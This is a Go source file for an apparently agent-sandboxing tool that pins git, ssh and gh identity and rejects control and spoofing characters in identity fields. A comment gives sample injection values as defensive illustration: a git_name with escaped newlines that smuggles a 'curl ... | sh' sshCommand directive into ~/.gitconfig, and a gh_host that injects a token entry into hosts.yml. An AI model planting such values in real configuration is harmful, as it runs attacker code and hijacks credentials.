package policy

import "fmt"

// SSHMode says how (and whether) the sandbox can use an ssh key.
type SSHMode string

const (
	// SSHAgentProxy is the recommendation for every real workflow: a filtering
	// proxy to the host's ALREADY-UNLOCKED agent, exposing exactly one key. No
	// key material inside, no passphrase prompt, other keys not enumerable.
	SSHAgentProxy SSHMode = "agent-proxy"

	SSHNone SSHMode = "none"
)

// ParseSSHMode is one of the four doors into policy.SSHMode, and it accepts
// two values. Anything else is unknown — there is no catalogue of spellings it
// judges individually, which is what keeps the accepted set readable as the
// whole set.
//
// The empty string is `none`, so a profile with an identity block and no
// ssh_mode gets no agent rather than a refusal.
func ParseSSHMode(s string) (SSHMode, error) {
	switch SSHMode(s) {
	case SSHAgentProxy, SSHNone:
		return SSHMode(s), nil
	case "":
		return SSHNone, nil
	default:
		return "", fmt.Errorf("unknown ssh_mode %q (want agent-proxy or none)", s)
	}
}

// Identity pins the sandbox to exactly one git/ssh/gh account.
//
// The point is not secrecy — it is blast radius. An agent that can sign with
// one key can push as that account and no other, and `gh api user` answers with
// that account and no other. Without pinning, "the agent has ssh" means "the
// agent is you, everywhere".
type Identity struct {
	// SSHKey is the PUBLIC key file that pins the identity. Only the public
	// half is read; the private key never leaves the host agent.
	SSHKey  string
	SSHMode SSHMode

	GitName  string
	GitEmail string

	GhUser string
	GhHost string // default github.com
}

// CheckText refuses a control character in any identity field.
//
// The same rule as checkEnvValue, at a sink that did not exist when it was
// written — and it is load-bearing rather than defensive, because every one of
// these fields is interpolated into a CONFIG FILE snug generates. With \u000A
// spelled as an escape, which is the only spelling go-toml accepts:
//
//	git_name = "x\u000A[core]\u000A\tsshCommand = curl ... | sh"
//	gh_host  = "a\u000Ab: {oauth_token: ...}"
//
// The first writes a git directive into ~/.gitconfig; the second a second host
// entry into gh's hosts.yml. Neither is a Mount, so Validate, rejectMasking and
// the provenance model are all blind to it — the same shape as the NUL in
// environ.set, one layer over. gh_user and gh_host additionally reach a terminal
// through the no-token refusal, where ESC[1A CR forges a `snug:` line.
//
// A raw control character never survives go-toml in a basic string; the \u
// escape does, which is what anyone re-testing this needs.
//
// The verdict is a property of the profile text, so it is the same on every host
// and belongs beside resolution rather than in a renderer.
//
// IT WAS A BYTE LOOP OVER `c < 0x20 || c == 0x7f`, AND THAT IS TWO SINKS SHORT.
// The directive-authoring half above is genuinely ASCII — only a newline writes
// a second git or YAML line — but these fields reach two artifacts a human READS
// as well: the generated ~/.claude/CLAUDE.md interpolates gh_user into a
// sentence with %s (internal/cli/claude.go), and the no-token refusal renders
// gh_user and gh_host to a terminal (that one quotes, so it was already safe).
// A byte loop cannot see U+009B and no loop keyed on unicode.IsControl can see
// U+202E, so the field that names the account the sandbox pushes as could be
// spelled to render as a different account in the file the agent is handed. It
// asks the one predicate now (IsForgingRune, forging.go), so this sink is
// widened by whatever widens the others.
func (i *Identity) CheckText(profileName ProfileName) error {
	if i == nil {
		return nil
	}
	for _, f := range []struct{ key, val string }{
		{"ssh_key", i.SSHKey},
		{"ssh_mode", string(i.SSHMode)},
		{"git_name", i.GitName},
		{"git_email", i.GitEmail},
		{"gh_user", i.GhUser},
		{"gh_host", i.GhHost},
	} {
		for _, r := range f.val {
			if !IsForgingRune(r) {
				continue
			}
			return fmt.Errorf("profile %q: identity.%s contains %q. Every identity field is "+
				"interpolated into a config file snug GENERATES — ~/.gitconfig, ~/.ssh/config, "+
				"gh's hosts.yml — where a NEWLINE writes a directive snug did not author, "+
				"and none of it is a Mount that Validate could refuse. They are also "+
				"rendered into the ~/.claude/CLAUDE.md the agent reads, and there "+
				"%s. Remove it",
				profileName, f.key, r, forgingRuneReason(r))
		}
	}
	return nil
}

// The generated ~/.gitconfig is rendered by GitConfigFrom in gitextract.go, not
// here, and this is where (*Identity).GitConfig used to be.
//
// One writer, one file. Two functions authoring the same path is how the last
// silent displacement happened, and the merge rule — extracted values fill in,
// a pinned identity overrides — has to live wherever the bytes are produced.
// The insteadOf rule this used to carry moved with it: it rewrites
// https://<host>/ to the ssh form so a push goes over the pinned key rather than
// hanging on a credential prompt no one can answer.

// PubKeyGuest is where the pinned PUBLIC key is staged inside the sandbox.
const PubKeyGuest = ".ssh/id_snug.pub"

// SSHConfig is the generated ~/.ssh/config.
//
// IdentityFile pointing at a .pub is the standard way to make ssh select
// exactly one agent identity, and it is REQUIRED here rather than decorative:
// `IdentitiesOnly yes` with no IdentityFile tells ssh to use only the
// identities named in the config, and naming none can leave it declining to
// offer the agent's key at all. The previous generation of this project staged
// the .pub for exactly this reason; an earlier draft of snug set
// IdentitiesOnly without it and would have broken agent auth.
//
// Only the public half is ever staged. The private key stays in the host agent.
func (i *Identity) SSHConfig(home string) []byte {
	if i == nil || i.SSHMode == SSHNone {
		return nil
	}
	return fmt.Appendf(nil,
		"# Generated by snug. The host's ~/.ssh is not mounted.\n"+
			"Host %s\n"+
			"\tUser git\n"+
			"\tIdentitiesOnly yes\n"+
			"\tIdentityFile %s/%s\n"+
			"\tStrictHostKeyChecking accept-new\n"+
			"\tUserKnownHostsFile %s/.ssh/known_hosts\n",
		i.host(), home, PubKeyGuest, home)
}

// The system-wide ssh_config replacement is no longer part of identity: it is
// authored on every run whose deepest covering grant supplies the host's copy,
// identity pinned or not. See SystemSSHConfigPaths, SystemSSHConfig and
// replaceSystemSSHConfig in systemsshconfig.go — this is where
// (*Identity).SystemSSHConfig used to be.

func (i *Identity) host() string {
	if i == nil || i.GhHost == "" {
		return "github.com"
	}
	return i.GhHost
}
